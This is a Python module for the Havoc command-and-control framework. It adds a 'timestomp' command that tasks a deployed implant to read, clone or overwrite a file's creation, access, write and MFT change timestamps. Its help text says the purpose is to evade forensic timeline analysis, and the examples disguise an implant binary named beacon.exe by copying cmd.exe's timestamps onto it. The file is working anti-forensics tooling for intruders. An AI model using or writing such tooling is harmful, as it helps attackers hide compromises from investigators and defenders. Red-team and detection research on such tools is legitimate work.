from havoc import Demon, RegisterCommand, RegisterModule
from datetime import datetime


def _parse_time(s):
    """Parse a human ISO-ish timestamp to a Windows FILETIME (100-ns ticks
    since 1601-01-01). Accepted forms:
        YYYY-MM-DD HH:MM:SS
        YYYY-MM-DDTHH:MM:SS
        YYYY/MM/DD HH:MM:SS
        MM/DD/YYYY HH:MM:SS
    The naive datetime is interpreted as the operator's local time."""
    s = s.strip().strip('"').strip("'")
    for fmt in ("%Y-%m-%d %H:%M:%S", "%Y-%m-%dT%H:%M:%S",
                "%Y/%m/%d %H:%M:%S", "%m/%d/%Y %H:%M:%S",
                "%Y-%m-%d %H:%M", "%Y-%m-%dT%H:%M"):
        try:
            dt = datetime.strptime(s, fmt)
            break
        except ValueError:
            continue
    else:
        raise ValueError(f"could not parse time: {s!r}")

    # .timestamp() treats a naive datetime as local time -> correct.
    unix = dt.timestamp()
    filetime = int((unix + 11644473600) * 10_000_000)
    if filetime < 0:
        raise ValueError("time is before 1601-01-01")
    return filetime


def _pack_filetime(packer, ft):
    packer.adduint32(ft & 0xFFFFFFFF)
    packer.adduint32((ft >> 32) & 0xFFFFFFFF)


def timestomp_cmd(demonID, *params):
    demon = Demon(demonID)

    if len(params) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage:\n"
            "  timestomp <file>                          show current timestamps\n"
            "  timestomp <original> <file-to-modify>    clone original's M/A/C times onto target\n"
            "  timestomp <file-to-modify> --time \"<TS>\" set M/A/C to a specific time")
        return False

    packer = Packer()

    if len(params) == 1:
        # display mode
        packer.addint(0)
        packer.addstr(params[0])
        msg = f"read timestamps of '{params[0]}'"
    elif len(params) == 2:
        # clone mode: <source/original> <target/to-modify>
        source = params[0]
        target = params[1]
        packer.addint(1)
        packer.addstr(source)
        packer.addstr(target)
        msg = f"clone '{source}' timestamps -> '{target}'"
    elif len(params) == 3 and params[1] == "--time":
        # set mode: creation/access/write all = same FILETIME
        target = params[0]
        try:
            ft = _parse_time(params[2])
        except ValueError as e:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, f"[-] {e}")
            return False
        packer.addint(2)
        packer.addstr(target)
        _pack_filetime(packer, ft)   # creation
        _pack_filetime(packer, ft)   # last access
        _pack_filetime(packer, ft)   # last write
        msg = f"set M/A/C timestamps on '{target}' to {params[2]}"
    else:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage:\n"
            "  timestomp <file>\n"
            "  timestomp <original> <file-to-modify>\n"
            "  timestomp <file-to-modify> --time \"<TS>\"")
        return False

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to {msg}")
    demon.InlineExecute(TaskID, "go", "bin/timestomp.x64.o", packer.getbuffer(), False)
    return TaskID


TIMESTOMP_HELP = (
    "Manipulate file timestamps (MAC times) to evade forensic timeline\n"
    "analysis. Uses NtSetInformationFile(FileBasicInformation) so the MFT\n"
    "ChangeTime is also rewritten, not just Creation/Access/Write.\n"
    "\n"
    "USAGE:\n"
    "  timestomp <file>\n"
    "      Show the file's current Creation / LastAccess / LastWrite times.\n"
    "  timestomp <original> <file-to-modify>\n"
    "      Clone the original file's timestamps onto <file-to-modify>.\n"
    "      First arg is the SOURCE (times are read from it); second arg is\n"
    "      the TARGET (whose MAC times get overwritten to match).\n"
    "  timestomp <file-to-modify> --time \"<timestamp>\"\n"
    "      Set Creation/Access/Write (and ChangeTime) to an explicit time.\n"
    "      Accepts 'YYYY-MM-DD HH:MM:SS' or 'YYYY-MM-DDTHH:MM:SS' (local time).\n"
    "\n"
    "EXAMPLES:\n"
    "  timestomp C:\\Windows\\Temp\\beacon.exe\n"
    "  timestomp C:\\Windows\\System32\\cmd.exe C:\\Windows\\Temp\\beacon.exe\n"
    "  timestomp C:\\Windows\\Temp\\beacon.exe --time \"2023-06-15 09:30:00\"\n"
)

RegisterCommand(timestomp_cmd, "", "timestomp",
                "Rewrite a file's MAC timestamps (and MFT ChangeTime) to evade timeline analysis", 0,
                TIMESTOMP_HELP,
                "C:\\Windows\\System32\\cmd.exe C:\\Windows\\Temp\\beacon.exe")
